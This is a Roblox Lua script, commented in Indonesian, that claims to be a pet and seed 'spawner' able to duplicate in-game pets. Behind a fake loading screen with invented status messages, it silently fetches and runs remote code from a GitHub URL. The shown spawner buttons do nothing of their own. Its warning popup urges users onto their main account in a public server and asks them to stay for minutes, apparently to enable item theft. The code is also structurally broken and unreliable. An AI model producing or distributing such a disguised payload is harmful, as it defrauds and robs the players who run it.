-- Hapus loading screen sebelumnya jika ada
if game.CoreGui:FindFirstChild("FullBlueLoadingScreen") then
    game.CoreGui:FindFirstChild("FullBlueLoadingScreen"):Destroy()
end

-- Sound efek spawn
local spawnSound = Instance.new("Sound")
spawnSound.SoundId = "rbxassetid://6026984224"
spawnSound.Volume = 1
spawnSound.Name = "SpawnSound"
spawnSound.Parent = game:GetService("SoundService")

-- Buat ScreenGui untuk loading
local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.Name = "FullBlueLoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Eksekusi script utama saat loading screen muncul
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
    end)
end)

-- Background biru + teks/loading bar
local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0, 102, 204)

local creditTop = Instance.new("TextLabel", bg)
creditTop.Size = UDim2.new(1,0,0.05,0)
creditTop.Position = UDim2.new(0,0,0.23,0)
creditTop.BackgroundTransparency = 1
creditTop.Text = "Spawner by: Jekak121"
creditTop.Font = Enum.Font.SourceSansBold
creditTop.TextScaled = true
creditTop.TextColor3 = Color3.new(1,1,1)

local loadingText = Instance.new("TextLabel", bg)
loadingText.Size = UDim2.new(1,0,0.1,0)
loadingText.Position = UDim2.new(0,0,0.3,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading Script"
loadingText.TextScaled = true
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextColor3 = Color3.new(1,1,1)

local progressBarBg = Instance.new("Frame", bg)
progressBarBg.Size = UDim2.new(0.6,0,0.05,0)
progressBarBg.Position = UDim2.new(0.2,0,0.5,0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(20,20,80)

local progressBar = Instance.new("Frame", progressBarBg)
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.BackgroundColor3 = Color3.fromRGB(0,153,255)

local creditText = Instance.new("TextLabel", progressBarBg)
creditText.Size = UDim2.new(1,0,1,0)
creditText.BackgroundTransparency = 1
creditText.Text = "Tiktok: @Jekak121"
creditText.Font = Enum.Font.SourceSansBold
creditText.TextScaled = true
creditText.TextColor3 = Color3.new(1,1,1)

local percentText = Instance.new("TextLabel", bg)
percentText.Size = UDim2.new(0,60,0.05,0)
percentText.Position = UDim2.new(0.81,10,0.5,0)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.Font = Enum.Font.SourceSansBold
percentText.TextScaled = true
percentText.TextColor3 = Color3.new(1,1,1)

local statusText = Instance.new("TextLabel", bg)
statusText.Size = UDim2.new(1,0,0.05,0)
statusText.Position = UDim2.new(0,0,0.57,0)
statusText.BackgroundTransparency = 1
statusText.Text = "Initializing..."
statusText.Font = Enum.Font.SourceSans
statusText.TextScaled = true
statusText.TextColor3 = Color3.fromRGB(240,240,240)

local statuses = {
    "Getting server data...",
    "Finding best server...",
    "Verifying session...",
    "Loading environment...",
    "Finalizing..."
}

task.spawn(function()
    local i = 1
    while screenGui and screenGui.Parent do
        statusText.Text = statuses[i]
        i = (i % #statuses) + 1
        wait(1)
    end
end)

local TweenService = game:GetService("TweenService")
local tween = TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)})
tween:Play()

task.spawn(function()
    for i = 1, 3 do
        percentText.Text = tostring(math.floor(i / 3 * 100)) .. "%"
        wait(1)
    end
    percentText.Text = "100%"
end)

tween.Completed:Connect(function()
    screenGui:Destroy()

function createSpawnerGui()
    -- Hapus jika sudah ada sebelumnya
    if game.CoreGui:FindFirstChild("SpawnerFloatingWindow") then
        game.CoreGui:FindFirstChild("SpawnerFloatingWindow"):Destroy()
    end
    if game.CoreGui:FindFirstChild("ReopenButton") then
        game.CoreGui:FindFirstChild("ReopenButton"):Destroy()
    end

    local gui = Instance.new("ScreenGui", game.CoreGui)
    gui.Name = "SpawnerFloatingWindow"
    gui.ResetOnSpawn = false

    -- Frame utama (window)
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
    frame.Active = true
    frame.Draggable = false

    -- Drag script untuk frame agar bisa dipindah-pindah
    local drag = Instance.new("LocalScript", frame)
    drag.Source = [[
        local UIS = game:GetService("UserInputService")
        local frame = script.Parent
        local dragToggle, dragInput, dragStart, startPos

        frame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragToggle = true
                dragStart = input.Position
                startPos = frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragToggle = false
                    end
                end)
            end
        end)

        frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                dragInput = input
            end
        end)

        UIS.InputChanged:Connect(function(input)
            if input == dragInput and dragToggle then
                local delta = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                           startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
    ]]

    -- Judul
    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0.15, 0)
    title.Text = "Spawner"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.SourceSansBold
    title.TextScaled = true
    title.BackgroundTransparency = 1

    -- Tombol Pet Spawner
    local petBtn = Instance.new("TextButton", frame)
    petBtn.Size = UDim2.new(0.5, -5, 0.2, 0)
    petBtn.Position = UDim2.new(0, 5, 0.2, 0)
    petBtn.Text = "Pet Spawner"
    petBtn.Font = Enum.Font.SourceSansBold
    petBtn.TextScaled = true
    petBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
    petBtn.TextColor3 = Color3.new(1, 1, 1)

    -- Tombol Seed Spawner (duplikat dari petBtn)
    local seedBtn = petBtn:Clone()
    seedBtn.Text = "Seed Spawner"
    seedBtn.Position = UDim2.new(0.5, 5, 0.2, 0)
    seedBtn.Parent = frame

    -- Popup counter untuk penataan popup notifikasi nantinya
    local popupCount = 0
        -- Fungsi untuk membuat form input dan tombol spawn
    local function createForm(name, isSeed)
        local form = Instance.new("Frame", frame)
        form.Size = UDim2.new(1, -20, 0.4, 0)
        form.Position = UDim2.new(0, 10, 0.45, 0)
        form.BackgroundTransparency = 1
        form.Visible = false

        local nameLabel = Instance.new("TextLabel", form)
        nameLabel.Size = UDim2.new(0.4, 0, 0.3, 0)
        nameLabel.Text = name .. " Name:"
        nameLabel.TextColor3 = Color3.new(1, 1, 1)
        nameLabel.Font = Enum.Font.SourceSansBold
        nameLabel.TextScaled = true
        nameLabel.BackgroundTransparency = 1

        local nameInput = Instance.new("TextBox", form)
        nameInput.Size = UDim2.new(0.6, 0, 0.3, 0)
        nameInput.Position = UDim2.new(0.4, 0, 0, 0)
        nameInput.Font = Enum.Font.SourceSansBold
        nameInput.TextScaled = true
        nameInput.Text = ""
        nameInput.BackgroundColor3 = Color3.fromRGB(200, 220, 255)

        local spawnBtn = Instance.new("TextButton", form)
        spawnBtn.Size = UDim2.new(1, 0, 0.3, 0)
        spawnBtn.Position = UDim2.new(0, 0, 0.7, 0)
        spawnBtn.Text = "Spawn"
        spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
        spawnBtn.TextColor3 = Color3.new(1, 1, 1)

        -- Tombol bantuan "?" hanya untuk Pet
        if not isSeed then
            local helpBtn = Instance.new("TextButton", form)
            helpBtn.Size = UDim2.new(0, 25, 0, 25)
            helpBtn.Position = UDim2.new(0, 0, 1, -25)
            helpBtn.Text = "?"
            helpBtn.Font = Enum.Font.SourceSansBold
            helpBtn.TextScaled = true
            helpBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 100)
            helpBtn.TextColor3 = Color3.new(0, 0, 0)

            -- Popup Attention
            local helpPopup = Instance.new("Frame", gui)
            helpPopup.Size = UDim2.new(0, 400, 0, 250)
            helpPopup.Position = UDim2.new(0.5, 160, 0.5, 60) -- kanan bawah sejajar menu
            helpPopup.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
            helpPopup.BackgroundTransparency = 0.1
            helpPopup.Visible = false
            helpPopup.ZIndex = 15
            Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)

            local helpTitle = Instance.new("TextLabel", helpPopup)
            helpTitle.Size = UDim2.new(1, 0, 0.15, 0)
            helpTitle.Position = UDim2.new(0, 0, 0, 0)
            helpTitle.Text = "⚠️ Attention ⚠️"
            helpTitle.Font = Enum.Font.SourceSansBold
            helpTitle.TextScaled = true
            helpTitle.TextColor3 = Color3.new(1, 1, 1)
            helpTitle.BackgroundTransparency = 1

            local helpContent = Instance.new("TextLabel", helpPopup)
            helpContent.Size = UDim2.new(1, -20, 0.7, 0)
            helpContent.Position = UDim2.new(0, 10, 0.15, 0)
            helpContent.TextWrapped = true
            helpContent.TextYAlignment = Enum.TextYAlignment.Top
            helpContent.Font = Enum.Font.SourceSans
            helpContent.TextColor3 = Color3.new(1, 1, 1)
            helpContent.TextScaled = true
            helpContent.BackgroundTransparency = 1
            helpContent.Text = [[
Please read this before you execute my script:
⚠️THINGS YOU NEED TO KNOW BEFORE EXECUTING THE SCRIPT⚠️
You must be in public server, don't play in private server.
Do not use a new account; use your main account.
This script works 100% if you already have the pet (e.g. Queen Bee, Dragonfly, RedFox, Raccoon).
It will dupe the pet with same age and weight.
If you don’t have those pets, success chance is 80%.
Wait 6–10 minutes before leaving the game to avoid ruining your data.
]]

            -- Tombol close popup attention
            local closeHelp = Instance.new("TextButton", helpPopup)
            closeHelp.Size = UDim2.new(0, 30, 0, 30)
            closeHelp.Position = UDim2.new(1, -35, 0, 5)
            closeHelp.Text = "X"
            closeHelp.Font = Enum.Font.SourceSansBold
            closeHelp.TextScaled = true
            closeHelp.TextColor3 = Color3.new(1, 1, 1)
            closeHelp.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
            Instance.new("UICorner", closeHelp).CornerRadius = UDim.new(0, 8)

            helpBtn.MouseButton1Click:Connect(function()
                helpPopup.Visible = true
            end)

            closeHelp.MouseButton1Click:Connect(function()
                helpPopup.Visible = false
            end)
        end
end)
